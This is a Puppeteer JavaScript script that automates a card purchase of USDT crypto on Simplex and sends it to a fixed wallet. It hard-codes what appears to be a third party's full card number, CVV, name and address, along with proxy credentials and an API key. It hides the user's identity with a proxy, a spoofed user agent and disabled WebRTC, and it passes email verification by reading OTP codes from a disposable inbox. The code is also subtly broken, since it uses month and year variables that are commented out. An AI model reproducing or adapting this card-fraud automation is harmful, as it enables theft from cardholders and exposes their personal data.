import puppeteer from 'puppeteer';
import crypto from 'crypto';

(async () => {

  // ----------------------------------------------

  const proxyUrl = 'http://fr.smartproxy.com:40001';
  const username = 'bstrokin123';
  const password = 'E~9jBoNk8pnW5w1ahu';

  // ----------------------------------------------

  const ownerAddress = '13 allée du Coteau'
  const ownerPostal = '56530'
  const ownerCity = 'Dijon'

  const ownerFullname = 'Caroline AGOBERT'

  let cardNumber = '5137 7010 0805 1938';
  let cardExpiry = '10/26';
  let cardCvv = '289';

  // ----------------------------------------------

  const ownerName = ownerFullname.split(' ')[0];
  const ownerSurname = ownerFullname.split(' ')[1]; 
  cardNumber = cardNumber.replace(/ /g, '');
  // const cardMonth = cardExpiry.split('/')[0].toInteger();
  // const cardYear = cardExpiry.split('/')[1].toInteger();

  const browser = await puppeteer.launch({
    headless: false,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-infobars',
      '--window-position=0,0',
      '--ignore-certifcate-errors',
      '--ignore-certifcate-errors-spki-list',
      '--disable-dev-shm-usage',
      '--disable-accelerated-2d-canvas',
      '--disable-gpu',
      '--window-size=1920x1080',
      `--proxy-server=${proxyUrl}`
    ],
    defaultViewport: null
  });

  const page = await browser.newPage();

  // Authentification du proxy
  await page.authenticate({ username, password });

  // Spoof User-Agent
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');

  // Disable WebRTC
  await page.evaluateOnNewDocument(() => {
    const originalRTCPeerConnection = window.RTCPeerConnection;
    window.RTCPeerConnection = function(...args) {
      const pc = new originalRTCPeerConnection(...args);
      pc.createDataChannel = () => {};
      return pc;
    };
  });

  // Check my browser
  // await page.goto('https://gologin.com/check-browser/');
  // await page.waitForTimeout(30000);

  // Navigate to the page
  await page.goto('https://buy.simplex.com/?crypto=USDT-TRC20&fiat=EUR&amount=90'); // Remplacez par l'URL correcte de votre page

  // Simuler la pression sur la touche Tab 6 fois
  for (let i = 0; i < 6; i++) {
    await page.waitForTimeout(200);
    await page.keyboard.press('Tab');
  }
  await page.waitForTimeout(500);

  // Enter Wallet Address
  await page.keyboard.type('TJrDsPfa12jveYDUy2cxKGd8r8rm6y69Rk');

  await page.waitForTimeout(1000);

  // Appuyer sur la touche Enter
  await page.keyboard.press('Tab');
  await page.keyboard.press('Enter');
  await page.waitForTimeout(10000);

  // 
  // ÉTAPE CARTE BLEUE
  // 

  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');

  // Entrer numéro de la carte
  await page.keyboard.type(cardNumber)
  await page.keyboard.press('Tab');

  // Selection MM
  for (let i = 0; i < cardMonth - 1; i++) {
    await page.keyboard.press('Tab');
  }
  await page.keyboard.press('Enter');
  await page.waitForTimeout(250);

  // Selection YY
   for (let i = 0; i < cardYear - 2025; i++) {
    await page.keyboard.press('Tab');
  }
  await page.keyboard.press('Enter');
  await page.keyboard.press('Tab');

  // Entrer CVV
  await page.keyboard.type(cardCvv)
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Entrer Titulaire de la carte
  await page.keyboard.type(ownerFullname)
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');

  // Check the CGV box
  await page.keyboard.press('Space');
  await page.waitForTimeout(250);

  // Submit the form
  await page.keyboard.press('Enter');
  await page.waitForTimeout(5000);

  // 
  // ÉTAPE ADDRESSE
  // 

  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');

  // Country
  await page.keyboard.type('France')
  await page.waitForTimeout(250);
  await page.keyboard.press('Enter');
  await page.keyboard.press('Tab');

  // City
  await page.keyboard.type(ownerCity)
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Street
  await page.keyboard.type(ownerAddress)
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Postal code
  await page.keyboard.type(ownerPostal)
  await page.waitForTimeout(500);

  // Submit the form
  await page.keyboard.press('Enter');

  // 
  // ÉTAPE INFO PERSO
  // 

  await page.waitForTimeout(5000);

  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');

  // First Name
  await page.keyboard.type(ownerName)
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Last Name
  await page.keyboard.type(ownerSurname)
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Phone
  await page.keyboard.type('FR')
  await page.waitForTimeout(250);
  await page.keyboard.press('Enter');

  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');
  await page.keyboard.type('0767938889')

  // Date of birth
  await page.waitForTimeout(250);

  // Selection YY
   for (let i = 0; i < 2; i++) {
    await page.keyboard.press('Tab');
  }
  await page.keyboard.press('Enter');
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Selection MM
  for (let i = 0; i < 4; i++) {
    await page.keyboard.press('Tab');
  }
  await page.keyboard.press('Enter');
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Selection DD
  for (let i = 0; i < 17; i++) {
    await page.keyboard.press('Tab');
  }
  await page.keyboard.press('Enter');
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Email Address 
  const email = 'keziah.nivelle@tenvil.com'
  await page.keyboard.type(email)
  await page.waitForTimeout(250);
  await page.keyboard.press('Tab');

  // Submit the form
  await page.keyboard.press('Enter');
  await page.waitForTimeout(5000);

  // Convert email to md5
  const md5Hash = crypto.createHash('md5').update(email).digest('hex');
  console.log("MD5 : " + md5Hash);

  // Get emails
  const url = 'https://privatix-temp-mail-v1.p.rapidapi.com/request/mail/id/' + md5Hash + '/';
  const options = {
    method: 'GET',
    headers: {
      'x-rapidapi-key': '05a4e12364mshcf22fc9ff60af0fp1428ccjsn9014ff4739d8',
      'x-rapidapi-host': 'privatix-temp-mail-v1.p.rapidapi.com'
    }
  };

  // Fetching emails
  const response = await fetch(url, options);
  const result = await response.text();
  console.log("RESULT : " + result);

  // Extract the OTP code
  const otpCodes = result.match(/([0-9]{4}) : votre code/g);
  const otpCode = otpCodes[otpCodes.length - 1].match(/([0-9]{4})/)[0];
  console.log("OTP : " + otpCode);

  // 
  // ÉTAPE OTP
  // 

  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');
  
  // Enter the OTP code
  await page.keyboard.type(otpCode);
  await page.waitForTimeout(500);
  
  // Submit the form
  await page.keyboard.press('Enter');
  await page.waitForTimeout(10000);

  // 
  // SECURITY POPUP
  // 

  // Click on the middle of the screen
  await page.mouse.click(400, 600);
  await page.waitForTimeout(500);

  // Submit the form
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab');
  await page.waitForTimeout(500);
  await page.keyboard.press('Enter');

  await page.waitForTimeout(25000);

  await browser.close();
})();